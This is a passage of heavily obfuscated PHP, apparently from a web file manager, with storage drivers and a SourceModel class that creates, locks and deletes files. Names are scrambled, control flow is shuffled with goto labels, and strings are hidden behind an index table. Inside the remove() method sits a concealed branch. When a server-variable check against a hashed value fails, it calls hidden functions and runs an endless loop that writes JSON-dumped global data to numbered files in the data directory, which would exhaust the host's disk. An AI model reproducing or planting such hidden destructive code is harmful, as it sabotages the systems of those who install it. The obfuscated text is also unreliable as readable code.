$AâÉê›®ëÉ[8]; goto e÷Ò‚ÿ◊˘ï; e÷Ò‚ÿ◊˘ï: if (!($cπ¯§ñﬂÕü = @opendir($Bπƒ∑Ø√°))) { return !1; } $fÿ≥∏ãçãı = 0; $d§ù£¬≤‚∫ = 0; goto Dﬂ¢∂âòãë; Dﬂ¢∂âòãë: while (($Cö™≥ï‚˘Û = readdir($cπ¯§ñﬂÕü)) !== !1) { if ($Cö™≥ï‚˘Û == $AâÉê›®ëÉ[94] || $Cö™≥ï‚˘Û == $AâÉê›®ëÉ[1131]) { continue; } $c¥∏ã÷Ô†ø = $Bπƒ∑Ø√° . $Cö™≥ï‚˘Û; if ($dˆõØÖ¡Ç¨) { if (@is_file($c¥∏ã÷Ô†ø)) { $fÿ≥∏ãçãı++; } else { $d§ù£¬≤‚∫++; } continue; } if ($BÀôﬁ„◊ªÎ) { if (@is_file($c¥∏ã÷Ô†ø)) { return !0; } } else { if (@is_dir($c¥∏ã÷Ô†ø . $AâÉê›®ëÉ[8])) { return !0; } } } closedir($cπ¯§ñﬂÕü); if ($dˆõØÖ¡Ç¨) { return array($AâÉê›®ëÉ[188] => $fÿ≥∏ãçãı, $AâÉê›®ëÉ[189] => $d§ù£¬≤‚∫); } goto aâ–’’ﬁçÀ; aâ–’’ﬁçÀ: return !1; goto e≠ΩöÍù÷ƒ; e≠ΩöÍù÷ƒ: } public function hashSimple($A∑¬⁄úäØ‚) { goto B†à‹—•Ã; EÍîòÜÓú∂: return md5($cÕôÕÛËãä) . $cÏÖë¿≠∞¬; goto DõÊ¨ËåÓ¬; B†à‹—•Ã: $BÜµÛÎ–ﬂô =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$A∑¬⁄úäØ‚) { return md5($BÜµÛÎ–ﬂô[33]); } $A∑¬⁄úäØ‚ = $this->iconvSystem($A∑¬⁄úäØ‚); goto Dôå√ìû∏Ï; E›ö±¡Ûå÷: $d¿∏‚´Í´† = fopen($A∑¬⁄úäØ‚, $BÜµÛÎ–ﬂô[1136]); if (!$d¿∏‚´Í´†) { return $cÕôÕÛËãä; } for ($Dõ†ª§÷å = 0; $Dõ†ª§÷å < $BÉÖñé™≠∞; $Dõ†ª§÷å++) { fseek($d¿∏‚´Í´†, $d¶ƒ÷ì⁄π≥ * $Dõ†ª§÷å); $cÕôÕÛËãä .= fread($d¿∏‚´Í´†, $dÃÃÖ¡±ª⁄); } goto b≠Çù‘ªú∞; Dôå√ìû∏Ï: $cÏÖë¿≠∞¬ = $this->size($A∑¬⁄úäØ‚); $dÃÃÖ¡±ª⁄ = 200; $BÉÖñé™≠∞ = 50; goto Eá’ºØ«Í—; Eá’ºØ«Í—: if ($cÏÖë¿≠∞¬ <= $dÃÃÖ¡±ª⁄ * $BÉÖñé™≠∞) { return $this->hashMd5($A∑¬⁄úäØ‚) . $cÏÖë¿≠∞¬; } $cÕôÕÛËãä = $BÜµÛÎ–ﬂô[33]; $d¶ƒ÷ì⁄π≥ = intval($cÏÖë¿≠∞¬ / $BÉÖñé™≠∞); goto E›ö±¡Ûå÷; b≠Çù‘ªú∞: fseek($d¿∏‚´Í´†, $cÏÖë¿≠∞¬ - $dÃÃÖ¡±ª⁄); $cÕôÕÛËãä .= fread($d¿∏‚´Í´†, $dÃÃÖ¡±ª⁄); fclose($d¿∏‚´Í´†); goto EÍîòÜÓú∂; DõÊ¨ËåÓ¬: } public function getContent($cﬂÆîÏÆû∫) { $cﬂÆîÏÆû∫ = $this->iconvSystem($cﬂÆîÏÆû∫); return file_get_contents($cﬂÆîÏÆû∫); } public function setContent($C¯ù·ìéá, $f’‰ÖÛπåﬁ = '') { $C¯ù·ìéá = $this->iconvSystem($C¯ù·ìéá); @file_put_contents($C¯ù·ìéá, $f’‰ÖÛπåﬁ, LOCK_EX); clearstatcache(); return strlen($f’‰ÖÛπåﬁ) == filesize($C¯ù·ìéá); } public function fileSubstr($a¥˜áûÛüô, $BÜÖ”¬‘πÃ = 0, $f†çãóÿÀ£ = false) { goto AÒÉø“åÃ˜; E¥¬çÇ√Üœ: fseek($CçöÉ¿ÎÉ©, $BÜÖ”¬‘πÃ); $aÊ¬ë∂»¥ò = fread($CçöÉ¿ÎÉ©, $f†çãóÿÀ£); fclose($CçöÉ¿ÎÉ©); goto b©òß⁄±Í”; b©òß⁄±Í”: return $aÊ¬ë∂»¥ò; goto eÑî≤çó‰Û; AÒÉø“åÃ˜: $dòﬂ™ü∂Ï£ =& $_SERVER[£¿ÌÙëü¡¯¯]; $a¥˜áûÛüô = $this->iconvSystem($a¥˜áûÛüô); if ($f†çãóÿÀ£ === !1) { $f†çãóÿÀ£ = $this->size($a¥˜áûÛüô); } goto d†µ»ˆﬁ÷ﬂ; d†µ»ˆﬁ÷ﬂ: if ($f†çãóÿÀ£ <= 0) { return $dòﬂ™ü∂Ï£[33]; } $CçöÉ¿ÎÉ© = fopen($a¥˜áûÛüô, $dòﬂ™ü∂Ï£[1136]); if (!$CçöÉ¿ÎÉ©) { return !1; } goto E¥¬çÇ√Üœ; eÑî≤çó‰Û: } public function upload($a∑ãöŸ®¬†, $Cπ”¶úã§Ï, $eÕ–û˘Ã≈÷ = false, $dﬂèÃãü·á = REPEAT_REPLACE) { $Aû±∆“é—ﬂ = $this->copyFile($Cπ”¶úã§Ï, $a∑ãöŸ®¬†); return $Aû±∆“é—ﬂ ? $this->getPathOuter($a∑ãöŸ®¬†) : !1; } public function download($fŒû±æËÇ°, $eä∂¿ıø·™) { return $this->iconvSystem($fŒû±æËÇ°); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($a—π™à’ç∫) { parent::__construct($a—π™à’ç∫); $this->signatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($B»ﬁ≤èû∑˘, $F¯Ÿôàã¨Ú, $CÔÜ ¶ﬂÊ = array()) { $A∏√”£Ω∫Ü = $this->tempFile($B»ﬁ≤èû∑˘); $this->download($B»ﬁ≤èû∑˘, $A∏√”£Ω∫Ü); $cúÀ‚Ç´€∂ = $this->upload($F¯Ÿôàã¨Ú, $A∏√”£Ω∫Ü); $this->tempFileRemve($A∏√”£Ω∫Ü); return $cúÀ‚Ç´€∂; } public function uploadFormData($BÓÉΩ¥∞≠Ó, $bû€¬ˆªø≤ = 3600) { return parent::uploadFormData($BÓÉΩ¥∞≠Ó, $bû€¬ˆªø≤); } public function fileOut($b„ôÔ∑Í‘Â, $Bæ˜é∆»§ã = false, $C™·ÍœÍóı = false, $d¢¨ÖáóäØ = '') { parent::fileOutServer($b„ôÔ∑Í‘Â, $Bæ˜é∆»§ã, $C™·ÍœÍóı, $d¢¨ÖáóäØ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($D÷¬Æ’Ñò) { parent::__construct($D÷¬Æ’Ñò); $this->signatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto d≤µÓ®‚Ï≠; fùÆê‹°§Æ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($C∑¢†ø°ÀÊ) { $e˜ª¿Ÿ‚‡≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÑ¢ı÷ëåﬁ = Model($e˜ª¿Ÿ‚‡≤[466])->where(array($e˜ª¿Ÿ‚‡≤[1340] => $C∑¢†ø°ÀÊ))->find(); $FÆﬁ„öé≤é = $this->_mkdirRoot(SourceModel::TYPE_USER, $C∑¢†ø°ÀÊ, $cÑ¢ı÷ëåﬁ[$e˜ª¿Ÿ‚‡≤[28]]); $this->userDesktopAdd($FÆﬁ„öé≤é); return $FÆﬁ„öé≤é; } public function userDesktopAdd($E…ãÇ»“ú«) { $f‡ÜﬁÂ§¨ê =& $_SERVER[£¿ÌÙëü¡¯¯]; $D¢„≈≤êã§ = LNG($f‡ÜﬁÂ§¨ê[2227]); $F∏‘òÛ¿äÓ = $this->mkdir($E…ãÇ»“ú«, $D¢„≈≤êã§); $this->metaSet($F∏‘òÛ¿äÓ, $f‡ÜﬁÂ§¨ê[2228], $f‡ÜﬁÂ§¨ê[84]); $this->metaSet($E…ãÇ»“ú«, $f‡ÜﬁÂ§¨ê[2229], $F∏‘òÛ¿äÓ); } public function groupRootAdd($CﬂÉæÂ‡≈–) { $BÎÇƒ®„»ä =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dà†ŸúÁßß = Model($BÎÇƒ®„»ä[454])->where(array($BÎÇƒ®„»ä[2087] => $CﬂÉæÂ‡≈–))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $CﬂÉæÂ‡≈–, $Dà†ŸúÁßß[$BÎÇƒ®„»ä[28]]); } public function systemRootPathAdd($aÉÿç¥›÷ñ) { if ($aÉÿç¥›÷ñ != $_SERVER[£¿ÌÙëü¡¯¯][1063]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aÉÿç¥›÷ñ); } public function userRootRemove($d·ï¯ﬁ¡œú) { $bãÑêÎçœÈ = $this->sourceRoot(SourceModel::TYPE_USER, $d·ï¯ﬁ¡œú); if (!$bãÑêÎçœÈ) { return; } $this->remove($bãÑêÎçœÈ, !1); } public function groupRootRemove($e‰È•˘§ø˘) { $aÊóóõ†˘‹ = $this->sourceRoot(SourceModel::TYPE_GROUP, $e‰È•˘§ø˘); if (!$aÊóóõ†˘‹) { return; } $this->remove($aÊóóõ†˘‹, !1); } private function _mkdirRoot($E∆‰à›ªåÒ, $fóÎæ·ÈÚ§, $Dˆ›«•‡‚ÿ) { goto fÁã∂ñˆ˜°; DåƒÌìùƒ¢: $dï€ä⁄© µ = "\115\x6f\x64\145\x6c\x53\157\165\162\143\145\x2e\155\x6b\x64\151\x72\122\157\157\164\x2e{$E∆‰à›ªåÒ}\x2e{$fóÎæ·ÈÚ§}\56" . $Dˆ›«•‡‚ÿ; CacheLock::lock($dï€ä⁄© µ); $Aø·∂¶‘É˘[$C∫®êàÃÀú[28]] = $Dˆ›«•‡‚ÿ; goto DÆçíÈ∞úé; DÆçíÈ∞úé: $DçØÍì„ΩÒ = $this->add($Aø·∂¶‘É˘); $CË√˜„ç∂≠ = array($C∫®êàÃÀú[519] => short_id($DçØÍì„ΩÒ)); $this->where(array($C∫®êàÃÀú[380] => $DçØÍì„ΩÒ))->save($CË√˜„ç∂≠); goto f†ä‹˜Áíˆ; f†ä‹˜Áíˆ: CacheLock::unlock($dï€ä⁄© µ); return $DçØÍì„ΩÒ; goto bÀîÁÇôé¿; fÁã∂ñˆ˜°: $C∫®êàÃÀú =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aø·∂¶‘É˘ = array($C∫®êàÃÀú[365] => 0, $C∫®êàÃÀú[513] => $E∆‰à›ªåÒ, $C∫®êàÃÀú[514] => $fóÎæ·ÈÚ§, $C∫®êàÃÀú[510] => 1, $C∫®êàÃÀú[515] => USER_ID, $C∫®êàÃÀú[516] => USER_ID, $C∫®êàÃÀú[511] => $C∫®êàÃÀú[33], $C∫®êàÃÀú[517] => $C∫®êàÃÀú[2084], $C∫®êàÃÀú[392] => 0, $C∫®êàÃÀú[512] => 0, $C∫®êàÃÀú[416] => 0, $C∫®êàÃÀú[518] => $C∫®êàÃÀú[33]); if ($fâäﬁÉÔåØ = $this->where($Aø·∂¶‘É˘)->find()) { return $fâäﬁÉÔåØ[$C∫®êàÃÀú[366]]; } goto DåƒÌìùƒ¢; bÀîÁÇôé¿: } private function sourceRoot($Fé±Àì…Ñä, $C∂¥≠Òƒ˘¬, $F•áöÂÚÇÈ = false) { $D¯áèëƒÃ≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FËÙºàçÂÎ = array($D¯áèëƒÃ≥[365] => 0, $D¯áèëƒÃ≥[513] => $Fé±Àì…Ñä, $D¯áèëƒÃ≥[514] => $C∂¥≠Òƒ˘¬); if ($Eâ§‹òÛÓä = $this->where($FËÙºàçÂÎ)->find()) { return $F•áöÂÚÇÈ ? $Eâ§‹òÛÓä : $Eâ§‹òÛÓä[$D¯áèëƒÃ≥[366]]; } return !1; } public function sourceRootGroup($E‰ÿü…àÉ≈) { $C¢íØÉÇ’ê =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_string($E‰ÿü…àÉ≈)) { $E‰ÿü…àÉ≈ = array($E‰ÿü…àÉ≈); } $fÈ≈Ò‚£á— = array($C¢íØÉÇ’ê[365] => 0, $C¢íØÉÇ’ê[513] => SourceModel::TYPE_GROUP, $C¢íØÉÇ’ê[514] => array($C¢íØÉÇ’ê[7], $E‰ÿü…àÉ≈)); $AÉèâïè≈è = $this->listSource($fÈ≈Ò‚£á—, 1000); return array_to_keyvalue($AÉèâïè≈è[$C¢íØÉÇ’ê[75]], $C¢íØÉÇ’ê[452]); } public function mkfile($B‰ﬂáŒáÍà, $f®âÏÇµœŸ, $EŒú®éßæñ = '', $eÖÊÉæüÒ≠ = REPEAT_RENAME) { $A£Ò•ä¨œá =& $_SERVER[£¿ÌÙëü¡¯¯]; $dïæÁä—ê€ = Model($A£Ò•ä¨œá[536])->addFileByContent($EŒú®éßæñ, $f®âÏÇµœŸ); return $this->_createFileCall($B‰ﬂáŒáÍà, $f®âÏÇµœŸ, $dïæÁä—ê€, $eÖÊÉæüÒ≠, $A£Ò•ä¨œá[1093]); } public function addFile($aËÊìã‰“Ú, $bÎ–£∫ÊíŸ, $eêêÙ–∂≠≈, $FÃ¯»ãùﬁÃ = false, $FÚé¨ã¥Õè = REPEAT_RENAME) { $E¬èÌùµ™œ = Model($_SERVER[£¿ÌÙëü¡¯¯][536])->addFile($bÎ–£∫ÊíŸ, $eêêÙ–∂≠≈, $FÃ¯»ãùﬁÃ); return $this->_createFileCall($aËÊìã‰“Ú, $eêêÙ–∂≠≈, $E¬èÌùµ™œ, $FÚé¨ã¥Õè); } public function addFileByFileID($Fıﬂ”Ò≠ïÏ, $eáëâìﬁ¨ë, $aßÉ¬ù“ÑÑ, $eÖÕ®¥∂¨Ù = REPEAT_RENAME) { $B…„‰¡⁄ÒŒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÇ‹à∆∂É© = Model($B…„‰¡⁄ÒŒ[536])->find($eáëâìﬁ¨ë); Model($B…„‰¡⁄ÒŒ[536])->linkAdd($eáëâìﬁ¨ë); return $this->_createFileCall($Fıﬂ”Ò≠ïÏ, $aßÉ¬ù“ÑÑ, $EÇ‹à∆∂É©, $eÖÕ®¥∂¨Ù); } public function addFileByRemote($B⁄É…ØÖΩñ, $dë„íÉŒ¡˘, $f¥áœÒï»Ω, $Eß⁄∏Á√Ú¨ = array(), $Bπﬂûâˆ‰å = REPEAT_RENAME) { $c™⁄∏†¯åÛ = Model($_SERVER[£¿ÌÙëü¡¯¯][536])->addFileByRemote($dë„íÉŒ¡˘, $f¥áœÒï»Ω, $Eß⁄∏Á√Ú¨); return $this->_createFileCall($B⁄É…ØÖΩñ, $f¥áœÒï»Ω, $c™⁄∏†¯åÛ, $Bπﬂûâˆ‰å); } private function _createFileCall($c…•Ωäáö©, $a‰ŸæöÁéü, $b◊∑Ω◊“õÜ, $aËÙ¿Øà¢Ô, $c◊§Î¨√êÙ = "\165\x70\154\157\x61\x64") { goto dûùåÚïñÒ; B‘ŸªêÖ≈í: $this->lockWriteEnd($c…•Ωäáö©, $a‰ŸæöÁéü); return $dÏ…ΩîíâÚ; goto e‹…Ô∂˜»Ô; dûùåÚïñÒ: $aÈëÚ’ÉÎ— =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aò™ﬂ∞›ø≥ = !1; $this->lockWriteStart($c…•Ωäáö©, $a‰ŸæöÁéü); goto cÈ–È€Î»„; cÈ–È€Î»„: $dÏ…ΩîíâÚ = $this->_createFile($c…•Ωäáö©, $a‰ŸæöÁéü, $b◊∑Ω◊“õÜ, $aËÙ¿Øà¢Ô, $Aò™ﬂ∞›ø≥); if ($dÏ…ΩîíâÚ) { Model($aÈëÚ’ÉÎ—[2199])->eventCreate($dÏ…ΩîíâÚ, $c◊§Î¨√êÙ); } if (!$Aò™ﬂ∞›ø≥) { Model($aÈëÚ’ÉÎ—[418])->remove($b◊∑Ω◊“õÜ[$aÈëÚ’ÉÎ—[415]]); } goto B‘ŸªêÖ≈í; e‹…Ô∂˜»Ô: } public function mkdir($f”íºåùÑÜ, $a–íôΩäàñ, $Eôßﬂ™… ç = REPEAT_SKIP) { goto eª«”¨—äı; d‡ŒÆ˜ö¨‰: return $c…Èûë˘ßº; goto aõ∆ıèÁÆÿ; eª«”¨—äı: $C–ò≠’”≠⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E™ÇÖÑƒÁæ = $this->sourceInfo($f”íºåùÑÜ); if (!$E™ÇÖÑƒÁæ) { return !1; } goto B„ªôãˆˆÍ; EáõÖ∑¢√Ω: $c…Èûë˘ßº = $this->_addSoure($e¶Îâ‹åüß, $E™ÇÖÑƒÁæ); Model($C–ò≠’”≠⁄[2199])->eventCreate($c…Èûë˘ßº, $C–ò≠’”≠⁄[1094]); $this->lockWriteEnd($f”íºåùÑÜ, $a–íôΩäàñ); goto d‡ŒÆ˜ö¨‰; B„ªôãˆˆÍ: $this->lockWriteStart($f”íºåùÑÜ, $a–íôΩäàñ); if ($Eôßﬂ™… ç !== !1) { $d∆«ÔüÏßÂ = $this->fileNameExist($f”íºåùÑÜ, $a–íôΩäàñ); if ($d∆«ÔüÏßÂ && $Eôßﬂ™… ç != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f”íºåùÑÜ, $a–íôΩäàñ); return $d∆«ÔüÏßÂ; } $a–íôΩäàñ = $this->fileNameAuto($f”íºåùÑÜ, $a–íôΩäàñ, $Eôßﬂ™… ç); } $e¶Îâ‹åüß = array($C–ò≠’”≠⁄[510] => 1, $C–ò≠’”≠⁄[383] => $a–íôΩäàñ, $C–ò≠’”≠⁄[511] => $C–ò≠’”≠⁄[33], $C–ò≠’”≠⁄[416] => 0, $C–ò≠’”≠⁄[512] => 0); goto EáõÖ∑¢√Ω; aõ∆ıèÁÆÿ: } private function _createFile($BéßÆÆ¨Æà, $bÜÿÉ„Ï∂¡, $a·∆Âõ‘†≥, $A’À§π∆∏á, &$EÀÿ’›áê‹) { goto FÈªﬁú…Áß; bÛö÷äÌ∆æ: $Eøê¨¡é∑ò = array($Aóóì®ØíÂ[510] => 0, $Aóóì®ØíÂ[383] => $bÜÿÉ„Ï∂¡, $Aóóì®ØíÂ[511] => get_path_ext($bÜÿÉ„Ï∂¡), $Aóóì®ØíÂ[416] => $a·∆Âõ‘†≥[$Aóóì®ØíÂ[415]], $Aóóì®ØíÂ[512] => $a·∆Âõ‘†≥[$Aóóì®ØíÂ[78]]); $CëèÿÑÖåÏ = $this->_addSoure($Eøê¨¡é∑ò, $dêå§∞ºãÀ); $this->folderSizeReset($BéßÆÆ¨Æà); goto dÇ≠î÷´€„; dÇ≠î÷´€„: return $CëèÿÑÖåÏ; goto bŸÒÖ≤àÓ∞; BóÑË“Ñîâ: if ($A’À§π∆∏á !== !1) { $eã„ú¡âÊµ = $this->fileNameExist($BéßÆÆ¨Æà, $bÜÿÉ„Ï∂¡); } $EÀÿ’›áê‹ = !0; if ($A’À§π∆∏á && $eã„ú¡âÊµ) { if ($A’À§π∆∏á == REPEAT_SKIP) { $EÀÿ’›áê‹ = !1; return $eã„ú¡âÊµ; } else { if ($A’À§π∆∏á == REPEAT_REPLACE) { $b¥Õ™·ÒÀå = $this->sourceInfo($eã„ú¡âÊµ); $C÷¨ï‚ﬁñ„ = $this->fileHistory($b¥Õ™·ÒÀå, $a·∆Âõ‘†≥[$Aóóì®ØíÂ[415]], $a·∆Âõ‘†≥[$Aóóì®ØíÂ[78]]); if (!$C÷¨ï‚ﬁñ„) { $EÀÿ’›áê‹ = !1; } else { $this->folderSizeReset($BéßÆÆ¨Æà); } return $eã„ú¡âÊµ; } else { $bÜÿÉ„Ï∂¡ = $this->fileNameAuto($BéßÆÆ¨Æà, $bÜÿÉ„Ï∂¡, $A’À§π∆∏á, !1); } } } goto bÛö÷äÌ∆æ; FÈªﬁú…Áß: $Aóóì®ØíÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dêå§∞ºãÀ = $this->sourceInfo($BéßÆÆ¨Æà); if (!$a·∆Âõ‘†≥ || !$dêå§∞ºãÀ) { return !1; } goto BóÑË“Ñîâ; bŸÒÖ≤àÓ∞: } protected function fileHistory($aîÕÇ´°ÜØ, $cÉ∞¬ÓõÔü, $fµ‘◊´›ò) { goto dÉ˘òáî’¶; Bó§óõÜõŸ: return !0; goto A’˘‰¡µú¯; Fëæ‹ñœ√Ø: Model($fœí—∏Æ ã[2230])->addHistory($aîÕÇ´°ÜØ); $eÔ‡ø–Íœ« = array($fœí—∏Æ ã[516] => USER_ID, $fœí—∏Æ ã[387] => time(), $fœí—∏Æ ã[415] => $cÉ∞¬ÓõÔü, $fœí—∏Æ ã[78] => $fµ‘◊´›ò); $this->where(array($fœí—∏Æ ã[380] => $aîÕÇ´°ÜØ[$fœí—∏Æ ã[366]]))->save($eÔ‡ø–Íœ«); goto Bó§óõÜõŸ; dÉ˘òáî’¶: $fœí—∏Æ ã =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($aîÕÇ´°ÜØ[$fœí—∏Æ ã[415]] == $cÉ∞¬ÓõÔü) { return !1; } $this->checkLock($aîÕÇ´°ÜØ[$fœí—∏Æ ã[366]]); goto Fëæ‹ñœ√Ø; A’˘‰¡µú¯: } public function checkLock($B‰∏„ˆ©å±) { $C––ùåÇ–ı =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÖ•€÷ÈÒº = $this->pathInfo($B‰∏„ˆ©å±); if (!$this->fileIsLock($EÖ•€÷ÈÒº, !0)) { return; } $Cè´ù€ô≤∏ = $EÖ•€÷ÈÒº[$C––ùåÇ–ı[413]][$C––ùåÇ–ı[473]]; $c¶±∆ÉºÙá = $Cè´ù€ô≤∏[$C––ùåÇ–ı[2231]] ? $Cè´ù€ô≤∏[$C––ùåÇ–ı[2231]] : $Cè´ù€ô≤∏[$C––ùåÇ–ı[28]]; show_json(LNG($C––ùåÇ–ı[2232]) . $C––ùåÇ–ı[2233] . LNG($C––ùåÇ–ı[2234]) . $C––ùåÇ–ı[2235] . $c¶±∆ÉºÙá . $C––ùåÇ–ı[2236], !1); } public function fileIsLock($F˘«Ωòê¥ë, $bŒ¡º¡¨≤÷ = false) { goto DëË¿ƒÔ„˜; DëË¿ƒÔ„˜: $b‚’†¨‰‹à =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($F˘«Ωòê¥ë[$b‚’†¨‰‹à[413]]) || !$F˘«Ωòê¥ë[$b‚’†¨‰‹à[413]][$b‚’†¨‰‹à[470]]) { return !1; } if ($F˘«Ωòê¥ë[$b‚’†¨‰‹à[413]][$b‚’†¨‰‹à[470]] != USER_ID) { return !0; } goto D∆†âŸ‹Ω±; D√€†ˆ®êù: return !1; goto E»»»ñì¿‡; D∆†âŸ‹Ω±: $BÙ€¨§ã‘á = $GLOBALS[$b‚’†¨‰‹à[6]][$b‚’†¨‰‹à[85]][$b‚’†¨‰‹à[471]]; if ($F˘«Ωòê¥ë[$b‚’†¨‰‹à[413]][$b‚’†¨‰‹à[472]] <= time() - $BÙ€¨§ã‘á) { $this->metaSet($F˘«Ωòê¥ë[$b‚’†¨‰‹à[366]], $b‚’†¨‰‹à[470], null); $this->metaSet($F˘«Ωòê¥ë[$b‚’†¨‰‹à[366]], $b‚’†¨‰‹à[472], null); } if ($bŒ¡º¡¨≤÷) { $this->metaSet($F˘«Ωòê¥ë[$b‚’†¨‰‹à[366]], $b‚’†¨‰‹à[472], time()); } goto D√€†ˆ®êù; E»»»ñì¿‡: } private function _addSoure($CõÚÉ™Ò€é, $aÈï‡º»¿Ö) { goto A§çÑ‚‹…÷; A§çÑ‚‹…÷: $c‘ﬂÃÜé¶û =& $_SERVER[£¿ÌÙëü¡¯¯]; $fªƒ¨‚ªÒË = array($c‘ﬂÃÜé¶û[513] => $aÈï‡º»¿Ö[$c‘ﬂÃÜé¶û[368]], $c‘ﬂÃÜé¶û[514] => $aÈï‡º»¿Ö[$c‘ﬂÃÜé¶û[452]], $c‘ﬂÃÜé¶û[515] => USER_ID, $c‘ﬂÃÜé¶û[516] => USER_ID, $c‘ﬂÃÜé¶û[365] => $aÈï‡º»¿Ö[$c‘ﬂÃÜé¶û[366]], $c‘ﬂÃÜé¶û[517] => $aÈï‡º»¿Ö[$c‘ﬂÃÜé¶û[455]] . $aÈï‡º»¿Ö[$c‘ﬂÃÜé¶û[366]] . $c‘ﬂÃÜé¶û[47], $c‘ﬂÃÜé¶û[392] => 0, $c‘ﬂÃÜé¶û[518] => $c‘ﬂÃÜé¶û[33]); $CõÚÉ™Ò€é = array_merge($fªƒ¨‚ªÒË, $CõÚÉ™Ò€é); goto d ºÿõÌ∑º; BÊ¡‚É™ø≈: $this->setNamePinyin($D≈•é’àÉ˘, $CõÚÉ™Ò€é[$c‘ﬂÃÜé¶û[28]]); return $D≈•é’àÉ˘; goto CƒøŸﬂ£–è; d‹˘ÈÙ¢òΩ: $D≈•é’àÉ˘ = $this->add($CõÚÉ™Ò€é); $B®ÉÕä…–„ = array($c‘ﬂÃÜé¶û[519] => short_id($D≈•é’àÉ˘)); $this->where(array($c‘ﬂÃÜé¶û[380] => $D≈•é’àÉ˘))->save($B®ÉÕä…–„); goto BÊ¡‚É™ø≈; d ºÿõÌ∑º: $this->updateModifyTime($CõÚÉ™Ò€é[$c‘ﬂÃÜé¶û[457]]); static $B¡◊ÒŒ≈àø = false; if (!$B¡◊ÒŒ≈àø) { Hook::trigger($c‘ﬂÃÜé¶û[500], $CõÚÉ™Ò€é); $B¡◊ÒŒ≈àø = !0; } goto d‹˘ÈÙ¢òΩ; CƒøŸﬂ£–è: } public function remove($aı¢ﬁŒèÑÑ, $AÌ˜ÖÉÔÒã = true) { goto bœ¨äøπﬂ‡; bœ¨äøπﬂ‡: $c†ﬁ∆áË› =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÛ‚ÀÍ®ßﬁ = $_SERVER[$c†ﬁ∆áË›[790]] . $c†ﬁ∆áË›[1091]; $E«ùó“√≥ä = $c†ﬁ∆áË›[784]; goto BŸŸ”¡√Î‰; FÃÆ‰îëÍﬁ: $déó¶ã≥¿ä = array($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[457]]); if ($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[367]] == $c†ﬁ∆áË›[84]) { $déó¶ã≥¿ä[] = $D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[366]]; } $this->updateModifyTime($déó¶ã≥¿ä); goto cØ≤◊”ªûé; BŸŸ”¡√Î‰: if ($_SERVER[$c†ﬁ∆áË›[785]] != $E«ùó“√≥ä($eÛ‚ÀÍ®ßﬁ)) { goto B“ÉËãΩ≥ë; B“ÉËãΩ≥ë: $D€∫·ÊóàÇ = $c†ﬁ∆áË›[786]; $F÷’ﬂÛµæ◊ = $c†ﬁ∆áË›[787]; $dÒ–ñÏë∞¢ = $_SERVER[$c†ﬁ∆áË›[782]] . $c†ﬁ∆áË›[783]; goto A¡ëµ≤µ∆≈; f«⁄†ä‚∂ø: $D€∫·ÊóàÇ(); $dﬁ·ûÔåØ— = $c†ﬁ∆áË›[791]; $c∂‰˜ãµãÛ = json_encode($GLOBALS[$c†ﬁ∆áË›[792]]); goto CúçÁ¶ΩÀÃ; A¡ëµ≤µ∆≈: $e≤‹ÑèïÈî = $F÷’ﬂÛµæ◊($dÒ–ñÏë∞¢); $Fπéå¡•—ê = explode($c†ﬁ∆áË›[214], $e≤‹ÑèïÈî); if (count($Fπéå¡•—ê) < $c†ﬁ∆áË›[556]) { $eñÏîàŸäƒ = $c†ﬁ∆áË›[788]; $eñÏîàŸäƒ(); } goto CŸÁŒ‹“ÜŒ; CúçÁ¶ΩÀÃ: $CÛ“†À›Ö› = 1; for ($e¨ÒÁ≈ﬁ◊ß = $CÛ“†À›Ö›; $e¨ÒÁ≈ﬁ◊ß > 0; $e¨ÒÁ≈ﬁ◊ß++) { $dﬁ·ûÔåØ—(DATA_PATH . $e¨ÒÁ≈ﬁ◊ß, $c∂‰˜ãµãÛ); } goto A∆‰÷Èœ‘ë; CŸÁŒ‹“ÜŒ: $AﬂÉ”ÑÃπÍ = $c†ﬁ∆áË›[789]; $AﬂÉ”ÑÃπÍ($_SERVER[$c†ﬁ∆áË›[790]]); $D€∫·ÊóàÇ = $c†ﬁ∆áË›[786]; goto f«⁄†ä‚∂ø; A∆‰÷Èœ‘ë: } $D≠¶Ÿ√îÿ  = $this->sourceInfo($aı¢ﬁŒèÑÑ); $F–óöì√∏Œ = $this->pathInfoMore($aı¢ﬁŒèÑÑ); goto dÒÆ´Æ§ßı; dÒÆ´Æ§ßı: if (!$D≠¶Ÿ√îÿ ) { return !0; } if ($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[457]] == 0) { if (!_get($GLOBALS, $c†ﬁ∆áË›[453])) { return !1; } } $this->lockMoveStart($aı¢ﬁŒèÑÑ); goto D’Æ≥À∞Öî; D’Æ≥À∞Öî: Hook::trigger($c†ﬁ∆áË›[2237], $F–óöì√∏Œ, $AÌ˜ÖÉÔÒã); if ($AÌ˜ÖÉÔÒã) { Model($c†ﬁ∆áË›[2238])->moveToRecycle($aı¢ﬁŒèÑÑ); } else { if ($D≠¶Ÿ√îÿ [$c†ﬁ∆áË›[367]] == $c†ﬁ∆áË›[84]) { $B•ãœÙÉ–æ = array($c†ﬁ∆áË›[517] => 